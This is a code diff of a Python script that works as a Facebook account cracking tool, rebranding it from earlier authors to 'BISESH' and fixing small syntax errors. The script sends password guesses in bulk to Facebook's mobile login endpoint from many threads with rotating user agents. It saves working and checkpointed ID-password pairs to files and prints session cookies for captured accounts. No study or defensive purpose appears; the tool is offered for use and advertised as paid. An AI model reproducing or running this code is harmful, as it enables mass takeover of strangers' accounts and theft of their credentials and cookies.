@@ -24,7 +24,7 @@ os.system('clear')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY MESSANGER GROUP")
 time.sleep(2)
 #os.system(f'xdg-open https://m.me/j/AbZwLw0pc0h4GVNy/')
-#------------------[ BISHESH ]-------------------#
+#------------------[ BISESH-King ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
@@ -111,7 +111,7 @@ pwpluss,pwnya=[],[]
  
  
 
-#------------[ BISHESH ]--------------#
+#------------[ BISESH- ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -187,7 +187,7 @@ def clear():
 def back():
     login()
 def contact():
-   # os.system('xdg-open https://www.facebook.com/OSCAR.King.Ok.Bro')
+   # os.system('xdg-open https://www.facebook.com/BISESH.King.Ok.Bro')
     back()
 def linex():
     print('\033[1;37m')
@@ -204,35 +204,42 @@ attemps = 0
 while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
     password = input(' \033[0;93mEnter Password: ')
-    if username == 'SENIOR' and password == 'KOLADO':
+    if username == 'B' and password == '7':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
   
 logo =""" 
           
 
-┳┓┳┏┓┓┏┏┓┏┓┓┏  ┓┏┏┓
-┣┫┃┗┓┣┫┣ ┗┓┣┫  ┃┃┏┛
-┻┛┻┗┛┛┗┗┛┗┛┛┗  ┗┛┗━
-                   
+\033[1;31m██████╗ ██╗███████╗██╗  ██╗███████╗███████╗. ██╗.    ██╗
+\033[1;32m██╔══██╗██║██╔════╝██║.   ██║██╔════╝██╔════╝██║      ██║
+\033[1;33m██████╔╝██║███████╗███████║█████╗  ███████╗███████║
+\033[1;34m██╔══██╗██║╚════██║██╔══██║██╔══╝  ╚════██║██╔══██║
+\033[1;35m██████╔╝██║███████║██║     ██║███████╗███████║██║      ██║
+\033[1;36m╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═╝       ╚═╝V2.0
+                                                   
+
+                                         
+                                                            
+
                                                             
   
    ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
    ║\33[0;41m        [ WORKING WIFI & MOBILE DATA ]       \033[0;92m║
    ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
    \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-   ║    Author                   • \33[1;38mBISHESH ]\33[1;38m    ║\033[1;31m 
-   ║    Facebook                 • BISHESH ]  ║  \033[1;97m  
-   ║    Github                   • \33[1;38mbishesh ]  ║\33[1;34m   
+   ║    Author                   • \33[1;38mSM-BISHESH ]\33[1;38m    ║\033[1;31m 
+   ║    Facebook                 • BISHesh Xettri ]  ║  \033[1;97m  
+   ║    Github                   • \33[1;38mBISESH-BRAND ]  ║\33[1;34m   
    ║    Whatsapp                 • 9808134286] ║\33[1;35m 
    ║    TOOLS                    • PAID ]        ║ \33[1;32m   
-   ║    VERSION                  • 2.0]         ║\033[1;35m 
+   ║    VERSION                  • 2.1 ]         ║\033[1;35m 
    \033[1;97m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,"')
-uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92mतिम्रो नाम के हो \033[1;91m: \33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  Bishesh,  BRAND,  Tools"')
+uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
+os.system('espeak -a 300 " Welcome,   to,  BISESH,  BRAND,  Tools"')
 pass
  
  
@@ -294,18 +301,18 @@ def menu():
     print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """)
     print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
     print('\033[0;97m=================')
-    OSCAR = input('\x1b[1;92m[+] CHOOSE: ')
-    if OSCAR in ['111']:
+    BISESH = input('\x1b[1;92m[+] CHOOSE: ')
+    if BISESH in ['111']:
         login()
         dump_massal()
-    elif BISHESH in ['1']:
+    elif BISESH in ['1']:
         crack_file()
-    elif BISHESH in ['2','02']:
-        os.system('xdg-open https://www.facebook.com/OSCAR.khadka.587')
+    elif BISESH in ['2','02']:
+        os.system('xdg-open https://www.facebook.com/BISESH.khadka.587')
         os.system("python nono.py")
-    elif BISHESHin ['3','03']:
+    elif BISESH in ['3','03']:
         result()
-    elif BISHESHin ['0']:
+    elif BISESH in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
@@ -316,7 +323,7 @@ def menu():
         animation(' [×] SELECT CORRECTLY ')
         back()
  
-    #-----------------[BISHESH-CRACK ]-----------------#
+    #-----------------[ BISESH-CRACK ]-----------------#
  
 def result():
     os.system('clear')
@@ -539,7 +546,7 @@ def setting():
     print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
     print('\033[0;91m==================')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
-    #os.system("xdg-open https://www.facebook.com/OSCAR.khadka.587")
+    #os.system("xdg-open https://www.facebook.com/bishesh.xettri")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -559,7 +566,7 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
     print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
     print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
-    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY BISHESH VAN Speed Up KO LAAGI')
+    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92जय बिशेष भन स्पीड अप को लागी')
     print('\033[0;97m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -634,7 +641,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;92m{bo}•[OSCARM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;92m{bo}•[BISESHM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -651,7 +658,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;94m[BISHESH-Cp] {idf} • {pw}')
+                print(f'\r\033[0;94m[FUCK YOU] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -661,8 +668,8 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[बधाई छ-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
-                os.system('espeak -a 300 " BISHESH,  Ok,  id"')
+                print(f'\r\033[0;92m[CONGRATULATIONS💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                os.system('espeak -a 300 " BISESH,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -676,7 +683,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[BISHESH-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[BISESH-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -693,7 +700,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•BISHESH-Cp] {idf} • {pw}')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•BISESH-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -703,8 +710,8 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•OSCAR-Ok] {idf} • {pw} ')
-                os.system('espeak -a 300 " Ok,  OSCAR,  id"')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•BISESH-Ok] {idf} • {pw} ')
+                os.system('espeak -a 300 " Ok,  BISESH,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
